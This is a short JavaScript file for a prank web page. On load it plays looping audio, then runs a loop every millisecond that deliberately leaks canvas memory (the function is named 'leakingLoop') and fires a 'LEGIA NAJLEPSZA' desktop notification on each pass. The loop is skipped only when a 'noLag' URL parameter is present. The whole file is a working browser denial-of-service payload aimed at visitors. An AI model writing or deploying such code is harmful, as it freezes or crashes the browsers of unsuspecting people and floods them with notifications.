function hideAudio(){
    audio.hidden = true;
}

function start(){
    const audio = document.createElement('audio');
    audio.setAttribute('id', 'audio');
    audio.setAttribute('src', 'sound.mp3');
    audio.setAttribute('type', 'audio/mp3');
    
    if (noSecureParam == null) {
        audio.setAttribute('loop', true);
        audio.setAttribute('controls', true);
        audio.addEventListener('play', hideAudio);
    } else {
        audio.setAttribute('loop', true);
        audio.setAttribute('autoplay', true);
        
    }
    document.body.appendChild(audio);

    if (noLagParam == null) {
        window.reallyFatCanvas = document.createElement('canvas');
        let context = window.reallyFatCanvas.getContext('2d');
        function leakingLoop() {
            context.canvas.width = document.body.clientWidth;
            context.canvas.height = document.body.clientHeight;
            const newContext = document.createElement('canvas').getContext('2d');
            context.context = newContext;
            context.drawImage(newContext.canvas, 0, 0);
            context = newContext;
            new Notification("LEGIA NAJLEPSZA", {
                icon: "favicon.ico"
            })
        }
        setInterval(leakingLoop,1);
    }
}

const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const noSecureParam = urlParams.get('noSecure');
const noLagParam = urlParams.get('noLag');

window.onload = start